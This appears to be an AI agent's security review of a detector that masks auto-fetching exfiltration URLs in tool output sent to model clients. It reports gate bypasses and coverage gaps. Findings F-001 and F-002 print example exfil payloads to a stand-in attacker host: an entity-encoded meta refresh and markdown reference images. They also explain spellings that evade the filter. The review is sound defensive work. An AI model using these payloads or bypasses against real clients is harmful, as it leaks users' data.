STATUS: DONE_WITH_CONCERNS

# T66 — independent review of T46 (the auto-fetch floor's surface coverage: enumeration, decision, normative edit)

Reviewer: independent (review-security-code + review-logic). I wrote none of the code, none of the
prior reviews and none of T46's probes. Every row below cites a probe I wrote and executed.

## Scope

- Branch: `codex/agent-first-core`; base commit `0bc6418fa1a038f8ec909cf949fecba077acf9a4`. All work
  under review is **uncommitted** in the main checkout `/Users/Goodea/goodea/keryx`; no worktree was
  entered.
- Artifacts read in full: `T46-spec.md`, `T46-implementation.md`; `T42-review.md` and `T53-review.md`
  on the judgement calls at issue; `T52-implementation.md`; `review-security-code/SKILL.md`,
  `review-logic/SKILL.md`; `docs/requirements/keryx-agent-first-core/policies.md`; the flow's
  `acceptance-criteria.md`.
- Code read: `src/security/detect/exfil.ts`, `src/security/detect/exfil.test.ts`,
  `src/security/detect/index.ts`, `src/security/redact.ts`, `src/mcp/dispatch.ts`,
  `src/security/persistence-sinks.test.ts`.

### File hashes (SHA-256), start and end — **DRIFT DETECTED**

| File | At start (21:39 local) | At end (21:52 local) | |
|---|---|---|---|
| `src/security/detect/exfil.ts` | `efe360a36fad99fd6d8f0e44490cd7424f2054bfbfb6ebc7ccd5f05d77250294` | `63edcc57c8604ab5e66534ca5c92d30ef0f77d942494d898dc2f07f479ab15cc` | **CHANGED** |
| `src/security/detect/exfil.test.ts` | `6ec7871cb8f145ef8fa83823590b96bf47f99e4f9f05213b220fcb3518a6a25b` | `a8f2365b22c595b627feb8da243e203440ac11f35b5d3a16f4d9fa260aed7f11` | **CHANGED** |
| `docs/requirements/keryx-agent-first-core/policies.md` | `61ddb7f61c62588c6f0f805cfcf4014561b98a117c671ed3cfd578bc8c80cfb4` | unchanged | — |
| `src/security/detect/index.ts` | `a509312d76e7771ec5d9b059207019bde8736ebf26131bc82b595f838bd79c0d` | unchanged | — |
| `src/security/redact.ts` | `b8e9d9a5ca35f78127096bd7f1880669859b6d1ebd6e30151070a4d75bd44b86` | unchanged | — |
| `src/mcp/dispatch.ts` | `f1db21b0872c7bb46b4ac09819f9676ed0fd1609652f8caf978640497b6f6f18` | unchanged | — |
| `src/security/persistence-sinks.test.ts` | `f00899ef34d08b7c3cf2cbe5f083a4cbfb09feac1b49855897ed27976f716ad1` | unchanged | — |
| `fixtures/exfil/cases.json` | `2f131992fa84c7be3fd299641a0c36e48424c4bf678906b86052c338402eeb4f` | unchanged | — |
| flow `acceptance-criteria.md` | `fc255c571b594e18e5517e9105b5b049407b97c5db2d9d58a48f98689f4f21c9` | unchanged (mtime 14:46, before T46) | — |

The start hash of `exfil.ts` equals the hash T46 records in its own change table, so every
measurement below was taken against **exactly the tree T46 delivered**. Mid-review a concurrent
writer (not a reader) replaced both files: the `<base>` inert-span machinery (`nonRenderedSpans`,
`fencedCodeBlockSpans`, `HTML_COMMENT_SPAN`, `isInNonRenderedSpan` — 0 occurrences now) was removed
under the label `T62#F-001 … (suppression reverted)`. T46's element table, gates and start-tag set
are untouched by that edit. **Every probe was re-run against the drifted file and every result is
byte-identical** (log hashes below), so the findings hold in both trees. See F-010.

## Summary

| Severity | Count |
|---|---|
| blocker | 2 |
| major | 2 |
| minor | 3 |
| info | 3 |
| **total** | **10** |

Two blockers: a **spelling bypass of both gates T46 introduced** (`<meta http-equiv="&#114;efresh">`
and `<input type="&#105;mage">` reach the client with `redaction.state:"none"` at all four
boundaries), and **three CommonMark reference-image spellings that neither enumeration found**, which
the re-derivation declares "already covered" and the requirements package now asserts as a complete
list. The 18-row widening itself is sound, correctly closed at every boundary, and I recommend
keeping `<iframe src>` covered.

---

## Stage 1 — one row per item in the dispatch

| # | Row | Verdict | What my own work found |
|---|---|---|---|
| 1 | The enumeration, re-derived | **PASS on HTML/CSS/SVG, FAIL on the markdown half** | I re-derived 51 fetching sites independently from the element index, the CSS `<url>` consumers and the SVG external-reference elements before reading T46's table, then diffed. All 7 "missed", both "over-counted" and the one "wrongly weighted" claims are correct. Nothing in HTML/CSS/SVG is missing from T46's list. But three markdown spellings are missing from **both** enumerations and are released: `![a][]`, `![a]`, `![a[b]c](url)` — F-002. Method + method statement below. Evidence: `T66-enum.log`, `T66-md-oracle.log`. |
| 2 | The measurement | **PARTIAL — after-half confirmed, before-half not reproducible** | After: `releasedFetching` is **exactly** the deferred set (`U12`, `U13`, `U14a-c`, `U15`, `U18`–`U22`, `U25`) plus `U17`; all 18 newly covered rows are `flagged`, fully masked, and closed at `dispatchCallTool`, `prepareOutputForPersistence`, `validateOutputForTransport` and `redactToolOutput` (`hostileFullyClosed: 17/17` of the rows I drove there). Before: the pre-T46 tree is unrecoverable (nothing committed), so "33 of 36" cannot be re-measured; I reconstructed the *shape* by running the same rows against the pre-flow detector from `HEAD` — 24 of 27 released, every newly covered row among them. Independent oracles used: Bun `HTMLRewriter` (lol-html) for attribute attribution — **0 disagreements** — and `marked` for the markdown rows. Evidence: `T66-enum.log`, `T66-boundary.log`, `T66-head-baseline.log`. |
| 3 | The decision line (infrastructure vs content) | **HOLDS AS IMPLEMENTED, but is not as clean as claimed** | Measured on realistic quoted files: an ordinary `index.html` (stylesheet + icon + script) → **0 findings**; an ordinary `site.css` (`@import` + `@font-face` + `url()` + `image-set()`) → **0 findings**. So the file-shaped carriers are precisely what is left open, as claimed. Two covered rows falsify the converse: an **HTML email template** → 5 findings, all `background` (a file-shaped carrier, no particular content — F-004), and a **generated docs redirect stub** → 1 finding whose whole `content` directive is masked (F-005). `<iframe src>`: **keep covered** — ruling below. Evidence: `T66-fp.log`. |
| 4 | The eager rows | **ACCEPTABLE, disclosure understated** | `href` on `<image>`/`<feImage>` and `background` on a stray `<td>`: eager, ~zero realistic benign carrier, and they err toward flagging — accept. Case-insensitive matching **does** create a new false-positive class: a quoted `.tsx` with `<Video src>`/`<Source src>`/`<Iframe src>` produced 4 findings, an MDX `<Embed src>` 1 — measured, not hypothetical. It is the same *kind* of cost as the already-accepted `<Image src>`/`<img src>` baseline, so it does not change the decision, but it is absent from the requirements package (F-003). Evidence: `T66-boundary.log`, `T66-fp.log`. |
| 5 | Nothing regressed | **PASS** | All nine prior matrices re-run by me reproduce their **recorded** outcomes exactly (not merely T46's logs): `T42-exfil-attack` 42/0/0; `T24-recheck2-exfil` 48/0/0; `T42-charrefs` 240 cases, no named/numeric bypass; `T53-extract` 88 cases, 0 bypasses, the same 14 over-approximation ids; `T53-resolve` 41×15, 0/0; `T53-base` 23 cases, 0 not-neutralized, benign `[g05, g06]`; `T53-boundary` 26 shapes, 0 leaking, `[ctlCdnBaseDoc]`; `T24-recheck2-boundary` 0 leaks on every row; `T52-base` 0/0. **Canonicalization and persistence boundary rows untouched**: `T42-boundary` ROW 2 all `ok=true sameParse=true`, ROW 3 `signalMatrix` equal **character-for-character** to the values recorded in `T42-review.md` lines 261-264. Corpus: benign files with findings **15**, the same 15 files and the same policy ids, no new policy id in benign content; Part B **6 flagged, the same 6 ids**. Evidence: `T66-rerun-*.log`, `T66-rerun-T53-corpus.log`. |
| 6 | The normative edit | **WARRANTED, EXECUTION INACCURATE** | Editing was justified: the package described the redaction norm and said nothing about the floor's scope, and the covered/deferred/never lists in the new subsection match `FETCHING_ATTRIBUTES` and `HTML_START_TAG` element-for-element. But it asserts *«перечень полный, не пример»* over a list whose `<input type=image>`, `<meta refresh>` and reference-definition entries are spelling-dependent (F-001, F-002), it overstates context-blindness in one direction and omits case-insensitivity in the other (F-003). `acceptance-criteria.md` **confirmed untouched** (hash + mtime 14:46, before T46's 21:10-21:31 window); only `policies.md` changed in the requirements package. |

### Method for row 1, stated

I wrote `T66-enum.ts` before reading T46's disposition table into the probe: one minimal fragment per
site, derived by walking (a) the HTML element index §4.2–§4.12 and §16 asking of each element "does
inserting it start a fetch with no user interaction", (b) the CSS `<url>` consumers — the ten
url()-taking properties, `@import` including its bare-string form, `@font-face src`, `image-set()` —
in both the `style=` and `<style>` contexts, and (c) the SVG elements referencing an external
resource through `href`/`xlink:href`. T46's disposition was then attached to each row as a data field
so the two lists diff mechanically rather than by eye. 58 rows, 51 of them fetching; every HTML row
is checked against lol-html (does a real tokenizer attribute this destination to this element) and
every markdown row against `marked` (does a real renderer emit an auto-fetching `<img>`). Sites I
derived that are in neither enumeration are marked `extra` and reported separately.

---

## Judgement calls

### 1. `<iframe src>` — the row T46 flagged for pushback: **KEEP IT COVERED**

T46's own criterion is the right one and it survives testing. Measured: a boilerplate `index.html`
and an ordinary `site.css` produce **0** findings, so the "a file, any file" property genuinely
belongs to `<script src>`/`<link href>`/CSS and not to `<iframe>`; a page carries no iframe unless it
deliberately embeds something. The cost is real and I reproduced it — `docsPageWithIframe` (a
quickstart page embedding a player) is masked, 1 finding — but it is one embedded resource, the
`<img>`-equivalent blast radius T53#F-001 established, and the allowlist remedy works on exactly this
row (`allowlistRemedyWorksOnIframe: true`, `T66-boundary.log`). Against that: `<iframe src>` is the
canonical EchoLeak-class vector after `<img src>`, and with `<img>`, `<video>`, `<embed>` and
`<object>` closed, leaving `<iframe>` open would let an attacker pay one word to defeat the whole
widening. Covering it is correct. The disclosure in §6.1 is honest and should stay.

### 2. The eager rows: **ACCEPTABLE**, but two of the three are described too kindly

- `href` on SVG `<image>`/`<feImage>` read without namespace context: accept. In the HTML namespace
  the parser renames `image`→`img` and `href` is inert, so the cost is a masked destination in markup
  no renderer fetches; there is no realistic benign carrier, and it errs toward flagging as every
  other extraction decision in this file does.
- `background` on a `<td>` outside a table: accept, same reasoning, cost bounded to one resource.
- The **case-insensitive component match is a real new false-positive class, and the disclosure
  understates it**. §6.4 frames it as capitalised JSX components; measured, the class is wider and
  more mundane — a `.tsx` hero component (`<Video>`, `<Source>`, `<Iframe>`) → 4 findings, an MDX
  `<Embed src>` → 1, and a plain lowercase `<video src="https://cdn…">` in a README → 2. Case
  insensitivity is not optional (HTML tag names are ASCII case-insensitive), and the cost is the same
  kind already accepted for `<img src>` in `README.md`, so **it does not change the decision** — but
  the corpus cannot exonerate it (F-004 shows the corpus is silent precisely where the classes live),
  and a reader of the requirements package cannot learn it (F-003).

### 3. The normative edit: **warranted, and I would not revert it — but it must be corrected**

Silence in a requirements package about the scope of a mandatory floor does let a reader conclude the
coverage is total, and that is the kind of inaccuracy the ownership clause contemplates; confining
the edit to one contiguous subsection plus a version bump, and offering rather than applying the
change to the credential-locator sentence, is the right restraint. The problem is the content: it
claims completeness it does not have (F-001, F-002 both live inside entries the list calls covered),
it says coverage ignores nesting and context *without exception beyond `<base>`* when in fact markup
inside a quoted attribute value is deliberately **not** flagged and an unterminated quoted value
suppresses the remainder of the fragment, and it never says that matching is case-insensitive, so a
reader underestimates coverage in the one direction the dispatch asked about. Correct the subsection;
do not remove it.

---

## Findings

### F-001 — blocker — both gates T46 introduced compare the RAW attribute value; a renderer compares the decoded one

- **file / line / symbol**: `src/security/detect/exfil.ts:520` `hasAttributeValue`, used at `:845`
  (`tag === "input"` gate) and `:848` (`isMetaRefresh` gate).
- **problem**: `hasAttributeValue` does `attribute.value.trim().toLowerCase() === expected` on the raw
  source bytes. The HTML tokenizer consumes character references in the attribute-value states
  (§13.2.5.35-.39), so `http-equiv="&#114;efresh"` **is** `refresh` in every engine and
  `type="&#105;mage"` **is** an image submit button. This module asserts that premise twice itself —
  `renderableUrl` decodes the destination "because the renderer that performs the auto-fetch decodes
  them too", and `metaRefreshDestination` (`:544`) decodes `content` "because a renderer decodes the
  attribute value before running the grammar". The decoding is applied to the value and withheld from
  the two gates that decide whether the value is read at all. The test file even pins
  `content="0&#59;url=…"` as decoded, so the author held the premise and did not carry it to the gate.
- **impact**: 7 measured spellings of the two surfaces the requirements package declares covered reach
  a model client unmasked. `<meta http-equiv="&#114;efresh" content="0;url=https://attacker.invalid/p?ctx=CTX">`
  is the NAV surface: on render it takes the whole client to the attacker. All 7 return from
  `dispatchCallTool` with `isError:false` and **`redaction.state:"none"`** — metadata affirmatively
  saying nothing was redacted — and pass `prepareOutputForPersistence`, `validateOutputForTransport`
  and the seam **byte-identical** with `attacker.invalid` present. This is a spelling bypass of a
  covered surface (AC5) and breaks "every covered surface is closed at the tool dispatch and the
  persistence materializer".
- **reproduction**: `bun .metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T66-gates.ts`
  → `gateBypasses: [inputTypeDecimalRef, inputTypeHexRef, inputTypeTrailingRef, inputTypeNoSemicolon,
  metaEquivDecimalRef, metaEquivHexRef, metaEquivTrailingRef]`, each row printing the raw gate value
  and its decoding. Boundaries: `bun …/T66-boundary.ts` →
  `leakingWithStateNone: [bypMetaRefreshCharref, bypMetaRefreshHexCharref, bypInputTypeCharref,
  bypInputTypeTrailingCharref, …]`.
- **suggested_fix**: compare the gate against `decodeCharacterReferences(attribute.value)` — the
  function already in this file, three lines above the table — keeping the existing
  `trim().toLowerCase()`; then add the four `type=` and three `http-equiv=` spellings to the T46 gate
  tests beside the `content="0&#59;…"` case that already exists.
- **class_scope**: every gate that decides on an attribute value rather than an attribute name.
  Sites: `exfil.ts:845` (`input`/`type`), `exfil.ts:848` (`meta`/`http-equiv`). Enumeration method:
  `hasAttributeValue` has exactly two call sites in the module (verified by reading the whole file);
  every other branch keys off the attribute **name**, which the tokenizer does not entity-decode.

### F-002 — blocker — three CommonMark reference-image spellings are released, and both enumerations call the surface covered

- **file / line / symbol**: `src/security/detect/exfil.ts:433` `REFERENCE_USE`, `:431` `INLINE`.
- **problem**: `REFERENCE_USE = /(!?)\[[^\]]*\]\[([^\]]+)\]/g` matches only the **full** reference form
  `![alt][ref]`; the reference definition is flagged only when such a use is found. CommonMark also
  defines the **collapsed** form `![alt][]` (the second group is empty, so the pattern fails) and the
  **shortcut** form `![alt]` (there is no second bracket pair at all). Separately, `INLINE`'s
  `\[[^\]]*\]` cannot span the balanced brackets CommonMark permits in a description, so
  `![a[b]c](URL)` matches nothing. All three render an auto-fetching `<img>`.
- **impact**: the most ordinary way to write a markdown reference image — `![logo]` with `[logo]: URL`
  at the bottom of the document, the shape every README uses — is a zero-click exfil channel that the
  floor releases. Measured through all four boundaries with `redaction.state:"none"`. This is not new
  code, but it is squarely inside what T46 undertook: §1 says the previous list "is **not** inherited"
  and is re-derived from the standard, §2.1 lists the markdown reference definition as covered, and
  §7 wrote that completeness claim into the **requirements package** as *«перечень полный, не
  пример»*. The re-derivation covered HTML/CSS/SVG and left the markdown half inherited.
- **reproduction**: `bun …/T66-md-oracle.ts` — `marked` (an independent CommonMark renderer, offline)
  emits `<img src="https://attacker.invalid/p?ctx=CTX">` for `collapsedReference`,
  `shortcutReference`, `shortcutReferenceInProse`, `collapsedUppercaseRef` and `inlineNestedBrackets`
  while `detectExfil` returns 0 findings for each; the full-reference control is flagged. Boundaries:
  `bun …/T66-boundary.ts` → `bypCollapsedRefImage`, `bypShortcutRefImage`, `bypNestedBracketAlt` leak
  at mcp/persist/transport/seam.
- **suggested_fix**: make the second bracket group optional and empty-tolerant —
  `/(!?)\[([^\]]*)\](?:\[([^\]]*)\])?/g` — resolving the label to group 3 when non-empty and to group
  2 otherwise (CommonMark's collapsed/shortcut rule), and keep the existing "only `!` uses trigger the
  definition finding" gate so plain reference *links* stay click-gated. The balanced-bracket
  description is a separate, smaller fix on `INLINE`. Then correct §2.1 and the `policies.md` covered
  list, which currently assert this is closed.
- **class_scope**: the markdown half of the enumeration. Sites: `exfil.ts:431` (`INLINE`, description
  grammar), `exfil.ts:433` (`REFERENCE_USE`, label grammar), `T46-spec.md:73` (row C2),
  `docs/requirements/keryx-agent-first-core/policies.md:28` (the covered list). Enumeration method:
  every CommonMark image spelling (inline, full reference, collapsed reference, shortcut reference,
  balanced-bracket description) driven through `marked` as oracle and through `detectExfil`, in
  `T66-md-oracle.ts`; the three released ones are the class.

### F-003 — major — the new `policies.md` subsection is inaccurate in both directions

- **file / line**: `docs/requirements/keryx-agent-first-core/policies.md:28` (the covered list) and
  `:34` (the context paragraph).
- **problem**: three defects. (a) The covered list is marked *«перечень полный, не пример»*, but
  `<input type=image src>`, `<meta http-equiv=refresh>` and the markdown reference definition are
  covered only for some spellings (F-001, F-002) — so the normative statement is stronger than the
  code. (b) *«Покрытие определяется по имени элемента и атрибута в исходном тексте, без учёта
  вложенности и контекста … Исключение сделано только для `<base href>`»* is not true: markup written
  inside another element's quoted attribute value is deliberately **not** a finding (the
  `HTML_START_TAG.lastIndex` decision, T53#F-004), and an unterminated quoted value suppresses
  detection for the rest of the fragment (T53#F-003) — two more context exceptions, both of which
  make coverage narrower than the sentence promises. (c) Nothing says the element match is
  case-insensitive, so a reader cannot learn that a quoted `.tsx` carrying `<Video src>` or
  `<Iframe src>` is masked — coverage **wider** than the document implies, which is the direction the
  dispatch asked about.
- **impact**: the acceptance criterion "the recorded limitation matches the implementation exactly, in
  both directions" is not met. A requirements package that overstates completeness is worse than the
  silence it replaced, because the next round will trust it instead of re-deriving.
- **reproduction**: covered/deferred/never lists diffed against `FETCHING_ATTRIBUTES` and
  `HTML_START_TAG` by reading both (they match); the three inaccuracies are demonstrated by
  `T66-gates.ts` (a), `exfil.ts:868-882` plus `T66-gates.ts` Part B (b), and `T66-fp.log`
  `reactMediaComponent: 4 findings` (c).
- **suggested_fix**: after F-001/F-002 are fixed, keep *«перечень полный»*; until then, qualify the two
  gated entries. Add the two context exceptions beside the `<base>` one, and add one clause saying
  element and attribute names are matched ASCII case-insensitively, so quoted component markup with
  the same names is covered too.
- **class_scope**: sites: `policies.md:28`, `policies.md:34`, `exfil.ts:41-63` (the module's
  "WHAT THIS FLOOR DOES NOT COVER" block, which has the same two omissions). Enumeration method: the
  limitation is recorded in exactly two places by T46 §7; both were read line by line against
  `FETCHING_ATTRIBUTES`, `HTML_START_TAG`, the `lastIndex` decision and the `readStartTag` EOF branch.

### F-004 — minor — U16's recorded justification ("benign incidence ~0 in modern source") is false

- **file / line**: `T46-implementation.md` §4 row U16 and §6.2; `exfil.ts:505-513`.
- **problem**: the `background` attribute is not obsolete in the one document class that still
  requires it — HTML email templates, where `<body background>`, `<table background>`,
  `<tr background>` and `<td background>` are ordinary practice for Outlook. A realistic template
  produced **5 findings** in one file, with no particular content: it is a *file*-shaped carrier, the
  exact property T46 used to defer `<script src>` and `<link href>`.
- **impact**: bounded. The same template already carries `<img src>`, which the accepted baseline
  masks, so the *kind* of harm is unchanged and the decision to cover U16 still stands. What is wrong
  is the recorded reason — "zero benign instances measured" is a measurement of a corpus that contains
  no email templates, and the next round will read it as evidence.
- **reproduction**: `bun …/T66-fp.ts` → `htmlEmailTemplate side=covered-side findings=5
  {"egress.html-image-exfil":5}`.
- **suggested_fix**: replace the justification with the accurate one — the carrier exists (HTML email
  templates), it already trips the accepted `<img src>` baseline, and the allowlist is the remedy.
- **class_scope** (optional at this severity): sites: `T46-implementation.md` §4 U16 row, §6.2;
  `T46-spec.md:227`.

### F-005 — minor — U02's "the mask has no cost of its own" ignores the quoted-source case

- **file / line**: `T46-implementation.md` §4 row U02 and §3; `exfil.ts:855-870`.
- **problem**: "masking a refresh removes a navigation nobody wanted" is true of a *rendered* document
  and false of a *quoted* one. A generated documentation redirect stub is a file whose entire content
  is one `<meta http-equiv=refresh>`; `ctx read` of it returns the destination masked — and because
  the whole directive is the mask span, the timeout goes too. That is a file-shaped, content-
  independent cost, the same shape as masking a `<script src>` in a quoted page.
- **impact**: small — one line of one file, and the reader can still see the `<a href>` fallback such
  stubs usually carry. It does not change the decision (the NAV blast radius dominates), but the cost
  weighing in §3 records a zero where there is not one.
- **reproduction**: `bun …/T66-fp.ts` → `docsRedirectStub side=covered-side findings=1
  {"egress.html-meta-refresh-exfil":1}`.
- **suggested_fix**: record the carrier in §6 beside the `<iframe>` disclosure.

### F-006 — minor — `<frame src>`'s "never cover" rests on an unverified insertion-mode claim, and covering it costs nothing

- **file / line**: `exfil.ts:452` (`HTML_START_TAG`, `frame` deliberately absent);
  `T46-implementation.md` §4 row U17.
- **problem**: the reason given is that a `<frame>` start tag is ignored in the "in body" insertion
  mode. That is a tree-builder claim, and no oracle in this flow can test it — lol-html is a
  tokenizer, and it attributes `src` to `<frame>` exactly as it does for `<iframe>` (my probe row
  `U17.frameSrc oracle=true`). The spec's "in body" rules do not name `frame`, so it falls to "any
  other start tag" and an `HTMLFrameElement` is created; whether it then loads is engine behaviour,
  not something this flow measured. Meanwhile the disposition moved from "cover now" to "never cover"
  on the aesthetic ground that "a principled exclusion is better than a gratuitous inclusion that
  costs nothing".
- **impact**: an asymmetric bet. If the claim is right, covering costs one table row and zero measured
  false positives; if it is wrong in any renderer, the surface stays open and a test now pins it open.
- **reproduction**: `T66-enum.log` row `U17.frameSrc cls=SUB t46=never oracle=true verdict=released`.
- **suggested_fix**: either cover it (one entry, `frame: { src: EMBEDDED_URL }`) or downgrade the
  claim to "not measured; excluded on the spec reading of the in-body insertion mode", so the next
  round knows it is a reading and not a measurement.

### F-007 — info — widening the anchor set widened the T53#F-003 suppression to the most common tags in quoted HTML

- **file / line**: `exfil.ts:452` `HTML_START_TAG`; `exfil.ts:611` `readStartTag` (the `close === -1`
  branch).
- **problem**: an unterminated quoted value consumes to end of input and the scan resumes past it, so
  everything after is unexamined. Before T46 this could only be triggered by `<img>`, `<image>` or
  `<base>`; it can now be triggered by `<td>`, `<tr>`, `<table>`, `<body>`, `<meta>`, `<source>` and
  the rest of the 20-element set — tags that appear in essentially every quoted HTML file.
- **impact**: **not a bypass under the stated threat model.** lol-html agrees with the detector on
  every one of my rows: after `<td title="x` an unterminated value swallows the following
  `<img src=…>` and no element is emitted (`lolHtmlSeesImg=false` for all rows, including the
  pre-existing `<img>` one). My probe's `markedRendersImg=true` column is **not** a fetch oracle — it
  only shows `marked` passing the bytes through as raw HTML, which the consumer then tokenizes the
  same way. Recorded because the blast radius of an inherited decision grew by an order of magnitude
  and T46 did not note it, and because it stops being safe for any renderer that sanitizes by
  re-serializing (already declared out of model).
- **reproduction**: `bun …/T66-gates.ts` Part B.

### F-008 — info — `<input type=text type=image src>` is a false positive a tree builder never fetches

- **file / line**: `exfil.ts:520` `hasAttributeValue`.
- **problem**: duplicate attributes are resolved eagerly — any occurrence of the gating value enables
  the branch — but a conformant tree builder keeps the **first** duplicate, so `type=text type=image`
  is a text input and fetches nothing.
- **impact**: a masked URL in a shape no renderer requests. Contrived, disclosed in the code comment,
  and it errs toward flagging; recorded only because the comment says the eager direction "costs
  nothing", and here it costs one false positive.
- **reproduction**: `T66-gates.log` → `FALSE-POSITIVE inputDupTypeTextFirst`.

### F-009 — info — the boundary regressions pin 11 of the 18 newly covered rows

- **file / line**: `src/security/detect/exfil.test.ts:983` `T46_CLASS_VECTORS`.
- **problem**: the persistence and transport regressions iterate 11 vectors; `<audio src>`,
  `<source src>`, `<video src>`, `<feImage href>`, `<image xlink:href>`, `<td background>` and
  `<track src>`'s non-default spelling are only covered by the detector-level test.
- **impact**: none observed — I drove 15 of the covered rows through all four boundaries myself and
  all are closed. It is a pinning gap, not a defect.
- **reproduction**: `T66-boundary.log` (`hostileFullyClosed: 17`).

### F-010 — major — the tree T46 verified no longer exists, and the focused suite was RED mid-review

- **file / line**: `src/security/detect/exfil.ts` (whole file), `src/security/detect/exfil.test.ts`
  (whole file).
- **problem**: both files were rewritten by a concurrent writer during this review (hashes above). The
  edit removes the `<base>` inert-span suppression under the label `T62#F-001 … (suppression
  reverted)` — the same suppression `exfil.ts`'s header, T53#F-001 and T63 justify at length, and
  which T46 preserved. At 17:45Z my `ctx run` of the four required suites returned **93 pass / 4 fail**
  (`T62#F-001: a base element inside a closed HTML comment is a finding again`, and three siblings)
  against T46's recorded **96 pass / 0 fail**; two minutes later, after the writer's next save, the
  same command returned 97/0.
- **impact**: T46's §8.1/§8.4/§8.5 evidence describes a tree that no longer exists, and the module's
  header comment now documents a `<base>` behaviour the code no longer has. Nothing in T46's own
  surface work is affected — every probe re-run after the drift is byte-identical — but the
  orchestrator cannot treat T46's verification as current, and two workers are writing the same file.
- **reproduction**: hash table above; `.metaproject/data/gdctx/raw/2026-09-06T17-45-01-455Z_run.log`
  (93/4) versus `…T17-32-14-893Z_run.log` (96/0); `nonRenderedSpans` occurrences in `exfil.ts`: 0.
- **suggested_fix**: serialize the writers, decide the T63-vs-T62 `<base>` question once, then re-run
  T46's nine matrices and the four focused suites against the settled tree.
- **class_scope**: sites: `src/security/detect/exfil.ts`, `src/security/detect/exfil.test.ts`.
  Enumeration method: SHA-256 of the eight dispatch-named files at review start and end; only these
  two differ, and the module was re-read to identify the removed symbols.

---

## Confirmed clean areas

- **The 18-row widening is correctly closed.** Every newly covered surface I drove — `input type=image`,
  `meta refresh`, `video poster|src`, `audio src`, `source src|srcset`, `track src`, `embed src`,
  `object data`, `iframe src`, `background` on all eight elements, SVG `image href|xlink:href`,
  `feImage href|xlink:href` — is flagged, fully masked, and closed at `dispatchCallTool`,
  `prepareOutputForPersistence`, `validateOutputForTransport` and `redactToolOutput` with
  `isError:false` and `state:"redacted"`. No partial masks: `partial: []` across 58 rows.
- **The deferred set is exactly what the documents say it is**, and each prerequisite is real: `link`
  and `script` need a non-empty allowlist because the file-shaped carriers measurably trip them;
  CSS additionally needs a value grammar (`@import "…"` and `image-set()` carry a URL with no `url()`
  spelling — both confirmed released); `srcdoc` needs nested recursion with offset mapping.
- **The never-cover decisions**, except `<frame src>` (F-006), are justified by renderer behaviour:
  external SVG `<use>` is same-origin restricted, and `<a href>`/`<a ping>`/`<area href>`/
  `<form action>`/`<button|input formaction>` are click- or submit-gated — all released, correctly.
- **Allowlist semantics are uniform**: every new surface is released under a matching allowlist entry
  and flagged without one, including the userinfo trick against an allowlisted host.
- **No false positive on relative destinations**: a fully-relative page carrying `<video src>`,
  `<video poster>`, `<iframe src>` and `<td background>` is `state:"none"` and byte-identical at every
  boundary; so is the public markdown link (AC5's third clause).
- **AC5's other two clauses hold**: `egress.markdown-link-sensitive-value` fires across the corpus
  (3 findings) and the re-run boundary matrices show URL-secret and field-name behaviour unchanged.
- **No test was removed** relative to the flow baseline: all 7 tests present in `HEAD`'s
  `exfil.test.ts` are still present.
- **`acceptance-criteria.md` and the rest of the requirements package are untouched**; only
  `policies.md` changed, at 21:26, inside T46's window.

## Evidence

All logs under `/Users/Goodea/goodea/keryx/.metaproject/data/gdctx/raw/`. Probes under
`/Users/Goodea/goodea/keryx/.metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/`
(`T66-enum.ts`, `T66-md-oracle.ts`, `T66-boundary.ts`, `T66-gates.ts`, `T66-fp.ts`).

| Log | SHA-256 |
|---|---|
| `T66-enum.log` | `4706e3613dfd7d3a267fc185ad479d93197ed9249566a183f683864639815209` |
| `T66-enum-after-drift.log` | `4706e3613dfd7d3a267fc185ad479d93197ed9249566a183f683864639815209` (identical) |
| `T66-md-oracle.log` | `896683fcf3ef2638322c7d6bf46d2878c0589f14ef104906483f8d7e8850dad9` |
| `T66-md-oracle-after-drift.log` | `896683fcf3ef2638322c7d6bf46d2878c0589f14ef104906483f8d7e8850dad9` (identical) |
| `T66-boundary.log` | `62a90cfed7f0cda434bc6b985073f4f7209d1ff6f3bb4d8fc235dd492247e76b` |
| `T66-boundary-after-drift.log` | `62a90cfed7f0cda434bc6b985073f4f7209d1ff6f3bb4d8fc235dd492247e76b` (identical) |
| `T66-gates.log` | `278f74442b439049d53e5af4d41c6890eff2771e09314b8a4e677f72d186e993` |
| `T66-gates-after-drift.log` | `278f74442b439049d53e5af4d41c6890eff2771e09314b8a4e677f72d186e993` (identical) |
| `T66-fp.log` | `07aca255cd77e2bea915255edf55b55883ccd08def158f533558a1a6f9e6a6af` |
| `T66-head-baseline.log` | `bdefa0a0f37afd0c08f39383f957ee74f906e148ed4c7c7d2f8247dfca628255` |
| `T66-rerun-T42-exfil-attack.log` | `0646c50821177132e3e84528af5557b609f244fc13f109224de1496f879222ba` |
| `T66-rerun-T24-recheck2-exfil.log` | `8c9bfec0481cd22957d98f5cd17f4ee37eb9a2c2d1d86bd88593d36bf2abf519` |
| `T66-rerun-T42-charrefs.log` | `698d88993076fd92aad9b4a4e1f8235a0eac2b7490baa0d34d8d1c65cac1b452` |
| `T66-rerun-T53-extract.log` | `ad20286ba1aab3f8e810d3c84f6a8610ba96e6362e810b5caf476f50b80834ad` |
| `T66-rerun-T53-resolve.log` | `0603791031f8f078bf7481c787fc828859306e62f95cc2109bf253c8b53cb2e4` |
| `T66-rerun-T53-base.log` | `19fd6efa2d6a33d6c23338ec37ce106c3756b191b01b916a6ddf845580934c7f` |
| `T66-rerun-T53-boundary.log` | `398012ceb8654c55f51235fd5548e0576c3369c7cf8159c251ccb2ff69b3768d` |
| `T66-rerun-T42-boundary.log` | `7030455d39a56b12e98c75b8a74c699a3d488dbf9d04b4ac060bfe9151f957c8` |
| `T66-rerun-T24-recheck2-boundary.log` | `838399622c42414f63dbda91cdd9c61dd0b4f83982c630ec1c34f5abeff3064b` |
| `T66-rerun-T52-base.log` | `a04404db8a1571b102dc21ae85517b3345eb94496553c0fb8bded5811010dff2` |
| `T66-rerun-T53-corpus.log` | `239958be49b6df737da183fc550706251419a89cd75bcbf9be2f21135cd8439c` |
| `2026-09-06T17-45-01-455Z_run.log` | the RED four-suite run (93 pass / 4 fail), via `ctx run` |

Constraints honoured: read-only on every production, test and documentation file; the only files
written are `T66-review.md`, `T66-result.json`, the five `T66-*.ts` probes and the `T66-*` logs above.
One `mktemp -d` staging directory (a copy of `HEAD`'s `exfil.ts`/`egress.ts`/`types.ts` for the
baseline reconstruction) was removed afterwards. No git state change, no flow CLI or state change, no
dependency change, no network, no model call, no `bun test` without file arguments. Every host is
reserved or synthetic (`attacker.invalid`, `cdn.example.org`, `docs.example.org`); nothing was
contacted.

## Routing audit

